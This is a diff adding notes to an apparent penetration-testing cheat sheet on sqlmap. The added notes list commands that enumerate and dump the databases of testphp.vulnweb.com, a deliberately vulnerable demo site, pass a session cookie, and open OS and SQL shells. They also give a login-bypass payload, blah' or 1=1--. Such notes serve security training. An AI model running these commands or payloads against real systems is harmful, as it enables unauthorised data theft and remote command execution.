@@ -666,6 +666,40 @@ sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D d
 sqlmap -u "http://10.10.10.10/file.php?id=1" --os-shell
 ```
 
+### Others Notes
+
+```bash
+URL = http://testphp.vulnweb.com/artists.php?artist=1
+
+Find DBs = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
+
+Result is DB name acuart
+
+Find Tables = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch
+
+Result is table name users
+
+Find columns = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
+
+Dump table = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
+
+Dump the DB = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch
+
+
+
+Reference = https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/
+
+Using cookies
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx' --random-agent --level=1 --risk=3 --dbs --batch
+
+SQL Injection
+
+in login page enter blah' or 1=1-- as username and click login without entering the password
+
+OS Shell = sqlmap -u 'url' --dbms=mysql --os-shell
+SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell
+```
+
 ### Other References
 
 [https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
